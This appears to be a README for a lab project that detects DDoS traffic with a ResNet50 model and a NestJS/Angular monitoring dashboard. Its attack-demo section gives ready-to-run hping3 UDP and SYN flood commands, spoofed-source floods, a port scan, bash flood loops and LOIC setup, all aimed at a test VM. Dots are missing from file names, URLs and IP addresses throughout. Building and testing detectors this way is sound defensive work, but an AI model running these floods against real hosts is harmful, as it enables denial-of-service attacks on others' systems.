# Intrusion Detection System (IDS) using Resnet50


## Overview

## Prerequisite
- python 3110
- NestJS 1102
- Angular 1916
- Kafka
- MonogoDB 234
- Visual Studio Code
- ngrok-v3-stable

## Usage

### Preparation

- 2 virtual machines installed on VMware

    - Machine B (Ubuntu): Is the attacking machine, used to run DDOS attack code on the server

    - Machine C (Ubuntu): Is the victim machine, running network traffic monitoring code

- 1 machine A (Windows or Ubuntu): Run monitoring app to receive data and display data on screen

    - In this case, I use my real machine to run monitoring app

    - We can merge machine A and machine C into a single virtual machine and install on VMware

    - However, I run monitoring app on my real machine because it is not as slow as virtual machine, so I can easily manipulate

### Train model (can be ignored)

- You can use Windows or Ubuntu However, you should use an external server to take advantage of the GPU power

#### Open train_model folder in VScode

- Create virtual environment and install libraries

    On Windows

    ```
    python -m venv venv
    venv\Scripts\activate
    pip install -r requirementstxt
    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
    ```

    On Ubuntu

    ```
    python -m venv venv
    source venv/bin/activate
    pip install -r requirementstxt
    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
    ```

- Can you check available GPU

    ```
    import torch

    print("Available? :", torchcudais_available())  # Must be True
    print("Total GPU:", torchcudadevice_count())  # Must be greater than 0
    print("GPU name:", torchcudaget_device_name(0) if torchcudais_available() else "No")
    print("Cuda version in PyTorch:", torchversioncuda)

    device = torchdevice("cuda" if torchcudais_available() else "cpu")
    print(f"Using: {device}") # Using: cuda
    ```

#### Datasets

- I extracted 2 balanced data files:

    - cicddos_2019csv (train_model/data/csv/cicddos_2019csv) with 8 labels, each label has 5000 data rows

    - BoTNeTIoT-L01-v2csv (train_model/data/csv/BoTNeTIoT-L01-v2csv) with 2 labels, each label has 10000 data rows

- Note: in this tutorial I will use cicddos_2019csv, if you use BoTNeTIoT-L01-v2csv you need to adjust the parameters when running the script

- Full Datasets 

#### Convert 

- Open 3_convert_df_to_imageipynb notebook and run all script

- Images


#### Train model

- Using Resnet50: open 4_train_resnet50_modelipynb notebook and run all script

- You also use AlexNet: open 6_train_AlexNet_modelipynb notebook and run all script

### Run monitoring app

- In my case, I use Windows and this is my laptop

#### Run NestJS back-end app

- Open monitoring-server (UI_monitor/monitoring-server) folder in VScode

    - Open terminal and run script to install Dependencies

        ```
        npm i
        ```

    - Open terminal and run app
        ```
        npm run start:dev
        ```

    - Use ngrok to public port 3000 of NestJS app into internet
        ```
        ngrok http 3000
        ```
    - Remember save the public URL

- Features:

    - Get the prediction result and send it to Angular application to display on screen via WebSocket

    - Save data to MongoDB for later retrieval


#### Run Angular app

- Open monitoring-client (UI_monitor/monitoring-client) folder in VScode

    - Open terminal and run script to install Dependencies

        ```
        npm i
        ```

    - Open terminal and run app

        ```
        ng s
        ```

- Features:

    - Display data, prediction results

    - Display charts

    - Images


### Run network traffic monitoring

- Run the application on machine C (victim machine), using Ubuntu

- Prepare model: I have prepared model resnet50_finetunedpth (network_traffic_monitoring/models/resnet50_finetunedpth)

- Open network_traffic_monitoring folder in VScode

- Create virual environment

    ```
    python -m venv venv
    source venv/bin/activate
    pip install -r requirementstxt
    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
    ```

- Change the API url is public URL of NestJS app

- Run with Administrator

    ```
    sudo $(which python3) mainpy
    ```

- Features:
    - Each network flow is fed into Kafka
    - Consumer takes the message and feeds it into the prediction model to get the result
    - Sends the result to the NestJS back-end

### Attack Demo

- Running on machine B (attack machine), using Ubuntu

- Use Python Script, LOIC, Hping3,...

#### Python Script

- Open attack_script folder in VScode

- Create virtual environment and install libraries

    ```
    python -m venv venv
    source venv/bin/activate
    pip install -r requirementstxt
    pip install torch torchvision torchaudio --index-url https://downloadpytorchorg/whl/cu118
    ```

- Run SYN attack
    ```
    sudo $(which python3) py3_SYN-Floodpy
    ```


#### LOIC

- Install mono-complete

    ```
    sudo apt update
    sudo apt install mono-complete
    ```

- Download LOIC tool release from github: https://githubcom/NewEraCracker/LOIC?tab=readme-ov-file

- Unzip the LOIC folder

- Open the extracted LOIC folder in CMD

    ```
    mono LOICexe
    ```

- Configure on the interface and run the attack

- Images

#### Hping3

- Install

    ````
    sudo apt install hping3
    ````

- Features:
    * Before attacking, check if the IP is on the same network
	    ```
        sudo hping3 -1 <dest-IP>
        ```

    * UDP flood attack
        ```
        sudo hping3 --flood --udp -p 80 --data 1200 172171293
        ```
        
        --flood : Send packets continuously without waiting for a response
        --udp : Use UDP protocol
        -p 80 : Send UDP packet to port 80 of destination machine (port can be changed)
        --data 1200 : Payload size is 1200 bytes

        Ex:
        ```
        sudo hping3 --flood --udp -p 80 --data 1200 19216820060
        ```

    * TCP SYN Flood attack
        ```
        sudo hping3 --flood -S -p 80 <dest-IP>
        ```
        
        -S : Send SYN packet (same as TCP handshake)
        --flood : Send continuously without waiting for response
        -p 80 : Target port (subject to change)

    * Create TCP packet with spoofed IP address:
        ```
        sudo hping3 -a 1921681100 -S -p 80 <dest-IP>
        ```

        -a 1921681100 : Source IP address spoofing
        -S : Send SYN packet
        -p 80 : Target port

    * Send custom packet (RAW Packet)
        ```
        sudo hping3 -PS -p 443 <IP-Đích>
        ```

        -PS : Send TCP packet with both PSH and SYN flags
        -p 443 : Send to port 443 (HTTPS)

    * Port Scanning
        ```
        hping3 -8 20-100 -S <IP-Đích>
        ```

    * HTTP Flood Attack
        ```
        hping3 -S --flood -p 80 --rand-source <IP-Web>
        ```
        
        --rand-source : Spoofing random source IP
        -p 80 : Target port

    * UDP attack with random number of packets
        - create udp_floodsh file with content:
        
            ```
            #!/bin/bash
            
            # Ctrl + C to stop
            trap "echo -e '\Stop!'; exit 0" SIGINT

            while true; do
                SIZE=$((RANDOM % 1701 + 300)) 
                #echo "Send UDP packet with $SIZE bytes"
                sudo hping3 --udp -p 80 --data $SIZE 19216820060 --rand-source --fast
                done
            ```

            RANDOM % 1701 + 300 → Generate random numbers from 300 to 2000
            --rand-source →Spoofing random source IP
            --fast → Send packets faster (no waiting between packets)
            while true → Infinite loop, send continuously
            
        - Run attack wait 1 second then send next packet

            ```
            #!/bin/bash
            
            # Ctrl + C to stop
            trap "echo -e '\nStop!'; exit 0" SIGINT
            TARGET_IP="19216820060"
            
            while true; do
                SIZE=$((RANDOM % 1701 + 300)) 
                sudo hping3 --udp -p 80 --data $SIZE -c 1 $TARGET_IP 
                    sleep 1 # wait 1 seconds
                done
            ```

        - Run in terminal
            ```
            chmod +x udp_floodsh
            sudo /udp_floodsh
            ```


## References

### CICFlowMeter
https://githubcom/YUANWRLD/CICFlowMeter

### Datasets

CIC DDOS 2019 full dataset
https://wwwkagglecom/datasets/rodrigorosasilva/cic-ddos2019-30gb-full-dataset-csv-files

BoTNeTIoT-L01-v2
https://wwwkagglecom/datasets/azalhowaide/iot-dataset-for-intrusion-detection-systems-ids?select=BoTNeTIoT-L01-v2csv

### Attack tools

Python SYN Flood Attack Tool
https://githubcom/EmreOvunc/Python-SYN-Flood-Attack-Tool


LOIC
https://githubcom/NewEraCracker/LOIC?tab=readme-ov-file


Hping3 Library
https://wwwkaliorg/tools/hping3/
